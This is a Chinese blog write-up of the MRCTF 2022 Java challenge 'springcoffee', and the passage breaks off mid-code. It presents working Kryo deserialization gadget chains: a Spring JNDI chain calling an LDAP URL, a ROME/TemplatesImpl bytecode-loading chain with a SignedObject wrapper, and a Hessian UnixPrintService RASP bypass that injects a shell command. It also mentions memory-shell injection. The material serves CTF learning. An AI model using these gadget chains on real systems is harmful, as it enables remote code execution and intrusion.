      <url>/2022/05/30/mrctf2022java%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF-java部分"><a href="#MRCTF-java部分" class="headerlink" title="MRCTF-java部分"></a>MRCTF-java部分</h1><h2 id="0x01-springcoffee"><a href="#0x01-springcoffee" class="headerlink" title="0x01 springcoffee"></a>0x01 springcoffee</h2><h3 id="1-题目"><a href="#1-题目" class="headerlink" title="1. 题目"></a>1. 题目</h3><p>拿到源码之后，不用多说的只有两个控制器是其中最关键的地方<kbd>/order</kbd><kbd>/demo</kbd>,其他的地方并没有什么太多的利用点。</p><p>其中<code>/order</code>是触发反序列化的地方，<code>/demo</code>是<code>set</code>可以修改kryo中的一些配置。</p><h3 id="2-做题"><a href="#2-做题" class="headerlink" title="2. 做题"></a>2. 做题</h3><p>经典的一个百度搜索+狗狗搜索，只有两篇还算的是有用的链接。</p><blockquote><p>1.<a href="https://cloud.tencent.com/developer/article/1624416">https://cloud.tencent.com/developer/article/1624416</a></p><p>2.<a href="https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/#Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/#Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p></blockquote><p>然后还有marshalsec的一段话</p><p><img src="https://img.dem0dem0.top/images/image-20220531181159793.png" alt="image-20220531181159793"></p><p>​上面这么多的信息是不是已经有一点眼花缭乱了，没关系，下面我来给大家整理一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Kryo 默认的配置只允许反序列化那些默认的有空参构造函数的类，(据说这样可以抵制许多的gadget)，但是里面也提供其他的支持(org.objenesis.strategy.StdInstantiatorStrategy)</span><br><span class="line">2.可以利用的payloads</span><br><span class="line">BeanComp ==&gt;commutil</span><br><span class="line">SpringBFAdv ==&gt; spring aop (这个是通了)</span><br><span class="line">ROME ==&gt; (有依赖)</span><br></pre></td></tr></table></figure><p>本地因为懒，没有去翻mar的这个pdf文档，所以在比赛的时候也没有去找到ROME这条链子，所以在比赛的时候当时不出网也就没有继续做下去了(其实是太懒了，当时去抖了~~~~).</p><p>下面放一下SpringBFAdv的exp(不出网就没法利用了，这个主要是打jndi的)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BeanFactory <span class="title function_">makeJNDITrigger</span> <span class="params">(String jndiUrl )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line">        Reflections.setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        Reflections.setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        <span class="keyword">return</span> bf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeBeanFactoryTriggerBFPA</span> <span class="params">( String name, BeanFactory bf )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">pcadv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        pcadv.setBeanFactory(bf);</span><br><span class="line">        pcadv.setAdviceBeanName(name);</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        c.setAdviceBeanName(name);</span><br><span class="line">        c.setBeanFactory(bf);</span><br><span class="line">        <span class="keyword">return</span> makeMap(pcadv, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">byte</span>[] genpayload1()<span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:1389/obj&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> makeBeanFactoryTriggerBFPA(jndiUrl, makeJNDITrigger(jndiUrl));</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> ( <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos) ) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo.writeClassAndObject(output, o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encode(bytes);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2022426/1650960191749-530973b0-300a-4726-8596-5dc570531fb3.png" alt="image-20220426160311823"></p><p>一个小细节，相信大家都知道了。</p><h3 id="3-正确解法"><a href="#3-正确解法" class="headerlink" title="3. 正确解法"></a>3. 正确解法</h3><p>ROME链子不出网，肯定就要糊一个加载字节码的东西出来。<code>TemplatesImpl</code>，他来了</p><p>先赛一个exp出来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] genpayload() <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;genByteCode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">item</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, obj);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, item);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> makeMap(root, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> ( <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos) ) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo.writeClassAndObject(output, o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encode(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后就报错了</p><p><img src="https://c.img.dasctf.com/images/2022426/1650976995489-6f72ab36-5146-4a1d-9a25-cad9445d5ed6.png" alt="image-20220426204307520"></p><p>这是和虎符一样的空指针报错，处理方法和虎符是一样的。signedObject</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">       setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;ClassPool.getDefault().get(MSpringJNIController.class.getName()).toBytecode()&#125;);</span><br><span class="line">       setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">       setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">ToStringBean</span> <span class="variable">item</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, obj);</span><br><span class="line">       <span class="type">EqualsBean</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, item);</span><br><span class="line">       <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">       setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,root);</span><br><span class="line">       KeyPairGenerator keyPairGenerator;</span><br><span class="line">       keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">       keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">       <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">       <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">       <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">       <span class="type">SignedObject</span> <span class="variable">so</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       so = <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException, privateKey, signingEngine);</span><br><span class="line">       <span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(SignedObject.class, so);</span><br><span class="line">       <span class="type">ObjectBean</span>  <span class="variable">ob</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, delegate);</span><br><span class="line">       <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> makeMap(ob, ob);</span><br></pre></td></tr></table></figure><p>这是🐉哥的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//        ObjectBean delegate = new ObjectBean(Templates.class, obj);</span></span><br><span class="line"><span class="comment">//        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashmap = makeMap(root,root);</span></span><br><span class="line"><span class="comment">//        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span></span><br><span class="line"><span class="comment">//        keyPairGenerator.initialize(1024);</span></span><br><span class="line"><span class="comment">//        KeyPair keyPair = keyPairGenerator.genKeyPair();</span></span><br><span class="line"><span class="comment">//        PrivateKey privateKey = keyPair.getPrivate();</span></span><br><span class="line"><span class="comment">//        Signature signature = Signature.getInstance(privateKey.getAlgorithm());</span></span><br><span class="line"><span class="comment">//        SignedObject signedObject = new SignedObject(hashmap, privateKey, signature);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ToStringBean item = new ToStringBean(SignedObject.class, signedObject);</span></span><br><span class="line"><span class="comment">//        EqualsBean root1 = new EqualsBean(ToStringBean.class, item);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashmap1 = makeMap(root1,root1);</span></span><br></pre></td></tr></table></figure><p>感觉优雅一丢丢。然后后面的就懂得都懂了。这里就已经可以任意代码执行了（绕rasp就不说了。</p><blockquote><p>rasp那个的绕过，一个就是直接</p><p>第二个就是<code>UnixPrintService</code>的get链子调用</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个糊到ROME链子里面问题不大把</span></span><br><span class="line">Constructor&lt;UnixPrintService&gt; declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(sun.print.UnixPrintService.class,</span><br><span class="line">declaredConstructor.newInstance(<span class="string">&quot;;open -na Calculator&quot;</span>));</span><br><span class="line"><span class="type">ObjectBean</span> <span class="variable">root</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, delegate);</span><br><span class="line">HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(os);</span><br><span class="line">HessianBase.<span class="type">NoWriteReplaceSerializerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianBase</span>.NoWriteReplaceSerializerFactory();</span><br><span class="line">sf.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">output.setSerializerFactory(sf);</span><br><span class="line">output.writeObject(map);</span><br><span class="line">output.getBytesOutputStream().flush();</span><br><span class="line">output.completeMessage();</span><br><span class="line">output.close();</span><br><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(os.toByteArray())));</span><br></pre></td></tr></table></figure><p><code>javaagent</code>注入内存马</p><h3 id="4-参考"><a href="#4-参考" class="headerlink" title="4.参考"></a>4.参考</h3><blockquote><p>1.<a href="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/#FactoryTransformer">https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/#FactoryTransformer</a></p><p>2.<a href="https://mp.weixin.qq.com/s?__biz=MzI3NTg2NTk5Mg==&amp;mid=2247484132&amp;idx=1&amp;sn=55fdb98a839bd2e0a8d14934a0fef757&amp;chksm=eb7f0a03dc0883155a73e1c9326e28be458aa55b7847c5390a43df8702403facb84ab0a06a04&amp;mpshare=1&amp;scene=22&amp;srcid=0425FBJKvWlNewXNv00ett0i&amp;sharer_sharetime=1650892131994&amp;sharer_shareid=ef2a828dd213b828cd3fe897350642f0#rd">https://mp.weixin.qq.com/s?__biz=MzI3NTg2NTk5Mg==&amp;mid=2247484132&amp;idx=1&amp;sn=55fdb98a839bd2e0a8d14934a0fef757&amp;chksm=eb7f0a03dc0883155a73e1c9326e28be458aa55b7847c5390a43df8702403facb84ab0a06a04&amp;mpshare=1&amp;scene=22&amp;srcid=0425FBJKvWlNewXNv00ett0i&amp;sharer_sharetime=1650892131994&amp;sharer_shareid=ef2a828dd213b828cd3fe897350642f0#rd</a></p><p>3.<a href="https://blog.wm-team.cn/index.php/archives/18/">https://blog.wm-team.cn/index.php/archives/18/</a></p></blockquote><h3 id="5-代码"><a href="#5-代码" class="headerlink" title="5. 代码"></a>5. 代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mrtf.springcoffee.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.mrtf.springcoffee.shell.MSpringJNIController;</span><br><span class="line"><span class="keyword">import</span> com.mrtf.springcoffee.util.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.impl.NoOpLog;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.BeanFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.mrtf.springcoffee.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Message <span class="title function_">order</span><span class="params">(CoffeeRequest coffee)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (coffee.extraFlavor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(coffee.extraFlavor));</span><br><span class="line">            <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(bas);</span><br><span class="line">            <span class="type">ExtraFlavor</span> <span class="variable">flavor</span> <span class="operator">=</span> (ExtraFlavor)<span class="built_in">this</span>.kryo.readClassAndObject(input);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, flavor.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (coffee.espresso &gt; <span class="number">0.5D</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;DOPPIO&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (coffee.hotWater &gt; <span class="number">0.5D</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;AMERICANO&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (coffee.milkFoam &gt; <span class="number">0.0D</span> &amp;&amp; coffee.steamMilk &gt; <span class="number">0.0D</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> coffee.steamMilk &gt; coffee.milkFoam ? <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;CAPPUCCINO&quot;</span>) : <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;Latte&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> coffee.espresso &gt; <span class="number">0.0D</span> ? <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;Espresso&quot;</span>) : <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;empty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Message <span class="title function_">demoFlavor</span><span class="params">(String raw)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(raw);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">serializeConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(raw);</span><br><span class="line">        <span class="keyword">if</span> (serializeConfig.has(<span class="string">&quot;polish&quot;</span>) &amp;&amp; serializeConfig.getBoolean(<span class="string">&quot;polish&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo = <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">            Method[] var3 = <span class="built_in">this</span>.kryo.getClass().getDeclaredMethods();</span><br><span class="line">            <span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> var3.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">setMethod</span> <span class="operator">=</span> var3[var5];</span><br><span class="line">                <span class="keyword">if</span> (setMethod.getName().startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">p1</span> <span class="operator">=</span> serializeConfig.get(setMethod.getName().substring(<span class="number">3</span>));</span><br><span class="line">                        <span class="keyword">if</span> (!setMethod.getParameterTypes()[<span class="number">0</span>].isPrimitive()) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                p1 = Class.forName((String)p1).newInstance();</span><br><span class="line">                                setMethod.invoke(<span class="built_in">this</span>.kryo, p1);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">                                var9.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            setMethod.invoke(<span class="built_in">this</span>.kryo, p1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos);</span><br><span class="line">        <span class="built_in">this</span>.kryo.register(Mocha.class);</span><br><span class="line">        <span class="built_in">this</span>.kryo.writeClassAndObject(output, <span class="keyword">new</span> <span class="title class_">Mocha</span>());</span><br><span class="line">        output.flush();</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;Mocha!&quot;</span>, Base64.getEncoder().encode(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BeanFactory <span class="title function_">makeJNDITrigger</span> <span class="params">(String jndiUrl )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line">        setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        <span class="keyword">return</span> bf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeBeanFactoryTriggerBFPA</span> <span class="params">( String name, BeanFactory bf )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">pcadv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        pcadv.setBeanFactory(bf);</span><br><span class="line">        pcadv.setAdviceBeanName(name);</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        c.setAdviceBeanName(name);</span><br><span class="line">        c.setBeanFactory(bf);</span><br><span class="line">        <span class="keyword">return</span> makeMap(pcadv, 